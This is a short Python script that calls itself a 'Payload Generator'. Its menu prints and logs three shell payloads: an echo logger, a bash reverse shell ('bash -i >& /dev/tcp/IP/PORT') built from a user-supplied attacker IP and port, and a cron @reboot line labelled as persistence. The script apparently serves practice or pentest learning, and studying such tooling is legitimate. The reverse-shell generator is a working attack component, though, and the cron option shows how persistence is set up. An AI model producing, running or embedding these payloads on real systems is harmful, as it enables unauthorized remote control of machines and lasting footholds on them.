import os
from datetime import datetime

log_file = "generated_payloads.log"

def log_payload(payload):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] {payload}\n"
    with open(log_file, "a") as f:
        f.write(entry)

def generate_echo_logger():
    return "echo 'Payload executed!' >> ~/payload_log.txt"

def generate_reverse_shell():
    ip =  input("Enter attacker ID: ")
    port = input("Enter attacker port: ")
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
def generate_cron_payload():
    return "@reboot echo 'Persistence active' >> ~/cron_payload_log.txt"

def main():
    print("== Payload Generator ==")
    print("[1] Echo Logger")
    print("[2] Reverse Shell")
    print("[3] Cron Job")
    choice = input("Select a payload type: ")

    if choice == "1":
        payload = generate_echo_logger()
    elif choice == "2":
        payload = generate_reverse_shell()
    elif choice == "3":
        payload = generate_cron_payload()
    else:
        print("[!] Invalid selection.")
        return

    print("\nGenerated Payload:")
    print(payload)

    log_payload(payload)

    save = input("\nSave payload to file? (y/n): ")
    if save.lower() == "y":
        filename = input("Enter file name to save to: ")
        with open(filename, "w") as f:
            f.write(payload + "\n")
        print(f"[+] Saved to {filename}")
    else:
        print("[*] Payload not saved to file.")

if __name__ == "__main__":
    main()
